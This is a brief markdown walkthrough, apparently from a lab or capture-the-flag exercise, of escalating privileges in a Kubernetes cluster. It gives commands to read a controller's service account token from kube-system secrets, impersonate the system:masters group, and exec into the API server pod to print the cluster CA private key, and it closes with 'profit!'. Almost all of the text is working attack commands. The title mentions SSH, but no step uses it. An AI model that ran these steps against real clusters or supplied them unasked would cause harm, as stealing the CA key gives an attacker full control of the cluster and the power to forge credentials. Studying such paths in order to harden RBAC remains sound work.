## SSH to Get Secrets

1. `kubectl get po -n kube-system` will fail (user doesn't have those rights)
2. `kubectl get secrets -n kube-system` will work and give you a list of available secrets
3. This will give you the clusterrole-aggregation-controller token `kubectl -n kube-system get secret clusterrole-aggregation-controller-token-[RAND] -o json`
4. base64 deocde the token field
5. Use the token as part of a kubectl command  `kubectl --as test --as=group=system:masters --token="[TOKEN]" get po -n kube-system` to get the API server pod name (The as and as-group flags are needed to ensure that the commands use the escalate verb which the clusterrole-aggregation-controller has)
6. get the key `kubectl --token="[TOKEN]" -n kube-system --as test --as=group=system:masters exec [API_SERVER_POD] cat /etc/kubernetes/pki/ca.key`
7. profit!